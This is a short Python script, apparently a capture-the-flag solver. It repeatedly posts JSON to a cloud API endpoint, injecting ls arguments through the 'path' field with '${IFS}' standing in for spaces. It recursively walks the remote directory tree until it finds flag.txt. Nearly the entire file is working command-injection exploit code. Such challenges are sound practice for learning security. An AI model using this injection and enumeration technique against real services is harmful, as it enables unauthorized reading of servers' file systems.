import requests
import json
import readline
import ast

url = "https://6feducn4d2.execute-api.eu-west-1.amazonaws.com/stag/wm05"

def solve(obj):
	x = requests.post(url, json=obj)
	x = x.text
	d = ast.literal_eval(x)
	# print(d)
	# print(obj)
	j = d["body"].split("\n")
	# print(j)
	# base case for no flag found
	if len(j) == 3:
		return

	for index, i in enumerate(j):
		if len(i) < 18: continue
		a = i.split(" ")
		ext = a[-1]
		if ext == '..' or ext == '.': continue
		print(i)
		if ("flag.txt") in i:
			print("FOUND", i)
			return
		else:
			temp = obj.copy()
			temp["path"] += ext + "/"
			# print(temp)
			# print(temp)
			solve(temp)

# def find(json_thing):
# 	d = ast.literal_eval(json_thing)
# 	j = d["body"].split("\n")
	
# 			if a[-1] != '..' and a[-1] != '.':
# 				recurse(a[-1])



# def recurse(x):
# 	s = "-al${IFS}/x/"
# 	obj = {"path":s}

if __name__ == '__main__':
	obj = {"path":"-al${IFS}/var/"}
	solve(obj)
